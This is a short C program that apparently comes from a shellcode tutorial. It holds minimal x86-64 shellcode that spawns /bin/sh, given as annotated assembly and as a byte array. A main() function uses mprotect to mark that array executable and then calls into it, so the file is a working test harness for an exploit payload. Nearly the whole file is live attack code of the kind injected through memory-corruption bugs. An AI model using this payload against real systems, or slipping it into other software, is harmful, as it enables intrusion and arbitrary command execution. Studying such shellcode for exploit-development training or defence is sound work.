/*

https://systemoverlord.com/blog/2014/06/05/minimal-x86-64-shellcode-for-binsh/

BITS 64

main:
  mov rbx, 0xFF978CD091969DD1
  neg rbx
  push rbx
  xor eax, eax
  cdq
  xor esi, esi
  push rsp
  pop rdi
  mov al, 0x3b  ; sys_execve
  syscall

 */

#include <sys/mman.h>
#include <stdint.h>

char code[] = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05";

int main(){
  mprotect((void *)((uint64_t)code & ~4095), 4096, PROT_READ|PROT_EXEC);
  (*(void(*)()) code)();
  return 0;
}
